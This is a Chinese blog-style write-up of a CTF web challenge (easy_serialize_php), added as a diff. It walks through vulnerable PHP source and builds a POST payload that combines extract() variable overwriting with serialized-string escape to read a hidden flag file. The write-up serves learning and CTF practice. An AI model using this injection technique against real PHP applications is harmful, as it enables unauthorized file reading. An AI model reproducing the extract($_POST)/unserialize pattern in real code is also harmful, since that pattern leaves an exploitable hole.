@@ -1,0 +1,173 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<p>我是大菜鸡！</p>
+<p>今天自己做的一道题，纪念一下。</p>
+<p>（转自我的博客：<a href="https://www.cnblogs.com/v2ish1yan/articles/16118319.html" title="[安洵杯 2019]easy_serialize_php - v2ish1yan - 博客园">[安洵杯 2019]easy_serialize_php - v2ish1yan - 博客园</a>）</p>
+<p><strong>知识点：</strong></p>
+<p><strong>1.用的刚好是我前面文章里面写的反序列化字符串逃逸。</strong></p>
+<p><strong>2.extract()变量覆盖</strong></p>
+<p>首先看题代码。</p>
+<pre><code class="language-php">&lt;?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}</code></pre>
+<p>从代码里面看可能的切入点。</p>
+<pre><code class="language-php">&lt;?php
+
+$function = @$_GET['f'];//懂的都懂
+
+function filter($img){//是一个过滤器，把符合filter_arr里面的字符替换为空（满足字符串逃逸的条件）
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);//把$_SESSION重置为空
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);//这里就用了变量覆盖的知识
+
+if(!$function){
+    echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));//把序列化后的$_SESSION用filter函数过滤
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){//ta没骗人，确实能找到一些东西
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));//这里只进行了一次base64解码。
+}</code></pre>
+<p>首先我们要知道$_SESSION是什么：https://blog.csdn.net/masterft/article/details/1640122</p>
+<p>单从做这个题来说，$_SESSION是访客与整个网站交互过程中一直存在的公有变量。</p>
+<p>然后看extract()函数的功能：</p>
+<p class="img-center"><img alt="" src="image\64f7ebe05fc94644656a4b0f4889b318.png"/></p>
+<p></p>
+<p></p>
+<p> extract($_POST)就是将post的内容作为这个函数的参数。</p>
+<p>然后就是变量覆盖。<strong>如果post传参为_SESSION[flag]=123，那么$_SESSION["user"]和$_SESSION["function"]的值都会被覆盖</strong>。</p>
+<p>至于为什么post要传_SESSION[flag]=123而不是$_SESSION[flag]=123，是因为_SESSION是变量名，如果传$_SESSION，那么就会失效。</p>
+<p>本地测试：</p>
+<pre><code class="language-php">&lt;?php
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] ='123';
+echo '覆盖前：';
+var_dump($_SESSION);
+echo "&lt;br&gt;";
+extract($_POST);
+echo '覆盖后：';
+var_dump($_SESSION);</code></pre>
+<p class="img-center"><img alt="" src="image\01e385266aa64951f669d6f35ac59356.png"/></p>
+<p>一步步来：先?f=phpinfo看看能找到什么东西。</p>
+<p class="img-center"><img alt="" src="image\664b775468bacff1a758b7da384a8c01.png"/></p>
+<p> 找到了一个php文件，意思是页面底部加载文件，即require()。</p>
+<p>所以就有可能要通过最后一个语句来打开查看这个文件。</p>
+<pre><code class="language-php">else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}</code></pre>
+<p>而那个文件名以base64编码后的字符串存在userinfo['img']里面，而$userinfo = unserialize($serialize_info)</p>
+<p>又$serialize_info= filter(serialize($_SESSION))。</p>
+<p>而且在提取文件时，只对文件进行了一次base64解码，所以对应代码里的</p>
+<pre><code class="language-php">if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</code></pre>
+<p>只能让img_path为空，并把guest_img.png逃逸出去。</p>
+<p>先本地测试，看看序列化后的字符串是什么样的:</p>
+<p class="img-center"><img alt="" src="image\b2b4b058aa84f5a74d5554448e5f9590.png"/></p>
+<p> 然后再进行变量覆盖</p>
+<p class="img-center"><img alt="" src="image\295cf4389eb7e070946894e2f68f480b.png"/></p>
+<p></p>
+<p></p>
+<p> 因为我们要让img的内容为d0g3_f1ag.phpbase64编码后的字符串，所以要传_SESSION[img]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</p>
+<p>但我们得到的是</p>
+<p class="img-center"><img alt="" src="image\4a43d8b7ed6d76ea3753b91a67e8c964.png"/></p>
+<p> 因为在变量覆盖后面，又重新给$_SESSION[img]赋值了，所以这个时候就要使用filter函数了，</p>
+<p>如果我们传的是_SESSION[imgphp]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</p>
+<p>那么得到的是</p>
+<p class="img-center"><img alt="" src="image\0ccbd20edfece50b60046a6a39234d48.png"/></p>
+<p> 这里就可以看出来一点字符串逃逸的感觉了。</p>
+<p>我最开始的想法是让s:6读取黄字部分</p>
+<p>a:2:{s:6:"<span style="background-color:#ffd900;">img";s:39:</span>";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"</p>
+<p>这样不就可以让后面的s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="生效了吗？</p>
+<p>我们试试构造一下</p>
+<p class="img-center"><img alt="" src="image\b15661fba23d98d3d277c20c0229812e.png"/></p>
+<p></p>
+<p> a:2:{s:10:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}这样看刚刚好，但是真的能成功吗？</p>
+<p>我们进行反序列化看看。</p>
+<pre><code class="language-php">&lt;?php
+$a=unserialize('a:2:{s:10:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}');
+print_r($a);</code></pre>
+<p>得到的结果</p>
+<p class="img-center"><img alt="" src="image\aec7b2bd11c6530ac965e25f6eb59dd6.png"/></p>
+<p></p>
+<p>不行！</p>
+<p>后来发现，看前面的a:2那里，如果我们这样构造的话，序列化内容就不满足a:2了。（即有两个元素）</p>
+<p>这个好解决，加一个不就行了吗，前面加上s:3:"123"来构造。</p>
+<p>_SESSION[imgphpflag]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</p>
+<p>得到：</p>
+<p>a:2:{s:10:"img";s:50:";s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}</p>
+<p>再反序列化看看</p>
+<p class="img-center"><img alt="" src="image\fbf7a88822ba1708279980fb3928dcce.png"/></p>
+<p></p>
+<p>成了！</p>
+<p><strong>payload：(post传参）</strong></p>
+<pre><code class="language-php">;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></pre>
+<p class="img-center"><img alt="" src="image\1cab70e61674900645bc943ce5b9870a.png"/></p>
+<p></p>
+<p> 后面的就简单了。</p>
+<p></p>
+</div>
+</div>
